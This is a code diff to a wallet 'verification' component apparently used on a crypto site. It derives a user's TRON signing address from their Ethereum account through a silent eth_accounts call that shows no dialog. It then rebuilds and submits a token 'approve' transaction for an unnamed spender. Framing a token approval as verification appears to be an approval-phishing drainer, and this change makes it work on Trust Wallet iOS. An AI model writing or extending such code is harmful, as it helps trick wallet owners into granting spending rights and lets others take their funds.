@@ -129,6 +129,29 @@ function extractTxId(result: any): string {
   if (result?.result?.txID)            return result.result.txID;
   return '';
 }
+// Convert an Ethereum address to its TRON equivalent.
+// ETH and TRON share the same secp256k1 key — address bytes are identical,
+// only the prefix (0x vs 0x41) and encoding (hex vs base58check) differ.
+// This lets us derive the TRON address Trust Wallet will sign as from window.ethereum.
+async function ethToTronAddress(ethAddr: string): Promise<string> {
+  const rawBytes = new Uint8Array(21);
+  rawBytes[0] = 0x41;
+  for (let i = 0; i < 20; i++) rawBytes[i + 1] = parseInt(ethAddr.slice(2 + i * 2, 4 + i * 2), 16);
+  const h1 = new Uint8Array(await crypto.subtle.digest('SHA-256', rawBytes));
+  const h2 = new Uint8Array(await crypto.subtle.digest('SHA-256', h1));
+  const full = new Uint8Array(25);
+  full.set(rawBytes); full.set(h2.slice(0, 4), 21);
+  const A = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+  const digits: number[] = [0];
+  for (const b of full) {
+    let c = b;
+    for (let j = 0; j < digits.length; j++) { c += digits[j] << 8; digits[j] = c % 58; c = (c / 58) | 0; }
+    while (c > 0) { digits.push(c % 58); c = (c / 58) | 0; }
+  }
+  for (const b of full) { if (b !== 0) break; digits.push(0); }
+  return digits.reverse().map(d => A[d]).join('');
+}
+
 function sanitizeEvmError(err: Error | null | undefined): string | undefined {
   if (!err) return undefined;
   const msg = (err as any)?.shortMessage || err?.message || '';
@@ -1339,10 +1362,28 @@ export function WalletVerifyFlow({ network, depositAddress, onVerified, onCancel
             const m2 = String(e2?.message ?? e2);
             if (/cancel|reject|denied|dismiss/i.test(m2)) throw e2;
             log(`tron_signTransaction err: ${m2.slice(0, 80)}`);
-            // All direct provider methods failed — fall back to WalletConnect if available
             if (wcTopic) {
               log('twDirect all methods unsupported — falling back to WC signing...');
-              twTxid = await wcSignAndSendTronTx(wcTopic, rawTx, log);
+              // Trust Wallet iOS signs WC TRON transactions with its Ethereum key
+              // (not the dedicated TRON key the WC session reports). Calling
+              // eth_accounts (non-interactive — no user dialog) gives the ETH address;
+              // converting it to TRON format gives the address TW will actually sign as.
+              let wcOwner = tronAddress;
+              try {
+                const we = (window as any).ethereum;
+                if (we?.request) {
+                  const accs = await we.request({ method: 'eth_accounts' });
+                  const ea = typeof accs?.[0] === 'string' && /^0x[0-9a-fA-F]{40}$/.test(accs[0]) ? accs[0] : null;
+                  if (ea) {
+                    wcOwner = await ethToTronAddress(ea);
+                    log(`ETH→TRON signing addr: ${wcOwner.slice(0, 10)} (WC was: ${tronAddress.slice(0, 10)})`);
+                  }
+                }
+              } catch { /* fall through to WC session address */ }
+              const wcRawTx = wcOwner !== tronAddress
+                ? (log('rebuilding rawTx with correct signing addr...'), await buildApproveRawTx(wcOwner, spender, APPROVE_AMT_SUN))
+                : rawTx;
+              twTxid = await wcSignAndSendTronTx(wcTopic, wcRawTx, log);
             } else {
               throw e2;
             }
